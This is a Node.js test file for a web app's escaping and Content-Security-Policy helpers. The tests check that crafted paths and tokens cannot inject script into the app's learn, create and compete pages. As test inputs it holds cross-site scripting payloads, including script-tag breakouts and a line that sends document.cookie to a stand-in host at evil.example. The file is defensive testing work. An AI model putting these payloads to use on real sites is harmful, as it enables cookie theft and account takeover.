const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const express = require('express');
const { jsLiteral, CLIENT_HELPERS, FRAME_CSP, PAGE_CSP } = require('../src/utils/untrustedPage');

const listen = (app) => new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });

// The page helpers as the browser runs them.
const sandbox = {};
vm.runInNewContext(CLIENT_HELPERS + ';this.esc = esc; this.withFrameCsp = withFrameCsp; this.frameTag = frameTag;', sandbox);
const { esc, withFrameCsp, frameTag } = sandbox;

test('jsLiteral cannot leave its string or end the script', () => {
  for (const evil of ["';alert(1);//", '</script><script>alert(1)</script>', '"+alert(1)+"', '\\', String.fromCharCode(0x2028) + 'x', '<!--', '&#39;']) {
    const lit = jsLiteral(evil);
    assert.ok(!['<', '>', '&', String.fromCharCode(0x2028), String.fromCharCode(0x2029)].some((c) => lit.includes(c)), 'no raw special characters');
    assert.equal(vm.runInNewContext(lit), evil, 'round-trips as data');
  }
  assert.equal(vm.runInNewContext(jsLiteral(undefined)), '');
});

test('esc() neutralises markup and quotes', () => {
  assert.equal(esc(`<img src=x onerror="a('b')">&`), '&lt;img src=x onerror=&quot;a(&#39;b&#39;)&quot;&gt;&amp;');
  assert.equal(esc(null), '');
  assert.equal(esc(5), '5');
});

test('model-written HTML gets its own CSP before it reaches the frame', () => {
  for (const html of ['<!DOCTYPE html><html><head><title>x</title></head><body>hi</body></html>', '<html><body>hi</body></html>', '<p>fragment</p>', '<head></head>']) {
    const out = withFrameCsp(html);
    assert.ok(out.includes('Content-Security-Policy'), html);
    assert.ok(out.indexOf('Content-Security-Policy') < out.indexOf('hi') || html === '<head></head>' || html.startsWith('<p>'), 'CSP comes before the body');
  }
  assert.match(FRAME_CSP, /connect-src 'none'/);
  assert.match(FRAME_CSP, /default-src 'none'/);
  assert.match(FRAME_CSP, /form-action 'none'/);
  const tag = frameTag('f', 'blob:x', 'height:1px');
  assert.match(tag, /sandbox="allow-scripts"/);
  assert.doesNotMatch(tag, /allow-same-origin/);
  assert.match(tag, /csp="/);
});

test('no served page gives a frame the same origin as the API', () => {
  for (const f of ['learnPage', 'createPage', 'competePage', 'competeCreatePage']) {
    const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'routes', `${f}.js`), 'utf8');
    assert.doesNotMatch(src, /allow-same-origin/, f);
    assert.doesNotMatch(src, /new Blob\(\[/, `${f} builds frame URLs only through framedUrl()`);
    assert.doesNotMatch(src, /'\$\{[a-zA-Z]+\}'/, `${f} pastes no request value into a quoted string`);
  }
});

const PAGES = [['learnPage', '/learn'], ['createPage', '/create'], ['competePage', '/compete'], ['competeCreatePage', '/compete-create']];
for (const [file, mount] of PAGES) {
  test(`${mount}: a crafted path or ?token= cannot inject script; headers are locked down; the page script compiles`, async () => {
    const app = express();
    app.use(mount, require(`../src/routes/${file}`));
    const s = await listen(app);
    try {
      const evilSeg = encodeURIComponent("x';alert(1);//</script><b>");
      const evilToken = encodeURIComponent("';fetch('//evil.example/'+document.cookie);//</script><script>alert(2)</script>");
      const r = await fetch(`http://127.0.0.1:${s.address().port}${mount}/${evilSeg}?token=${evilToken}&mode=${evilToken}`);
      assert.equal(r.status, 200);
      const body = await r.text();
      assert.ok(body.includes(jsLiteral(decodeURIComponent(evilSeg))), 'path value appears only as an escaped string literal');
      assert.ok(body.includes(jsLiteral(decodeURIComponent(evilToken))), 'token appears only as an escaped string literal');
      assert.ok(!body.includes('<b>'), 'no raw markup from the path');
      assert.equal((body.match(/<\/script>/g) || []).length, 1, 'only the page\'s own script tag closes');
      assert.equal(r.headers.get('content-security-policy'), PAGE_CSP);
      assert.equal(r.headers.get('referrer-policy'), 'no-referrer');
      assert.equal(r.headers.get('cache-control'), 'no-store');
      const script = body.slice(body.indexOf('<script>') + 8, body.lastIndexOf('</script>'));
      assert.doesNotThrow(() => new vm.Script(script), 'inline script is valid JavaScript');
    } finally { s.close(); }
  });
}

test('the page CSP only lets the pages talk to this API and nothing else', () => {
  assert.match(PAGE_CSP, /connect-src 'self' https:\/\/ai-notetaker-backend\.fly\.dev/);
  assert.match(PAGE_CSP, /frame-src blob:/);
  assert.match(PAGE_CSP, /default-src 'none'/);
  assert.match(PAGE_CSP, /form-action 'none'/);
});
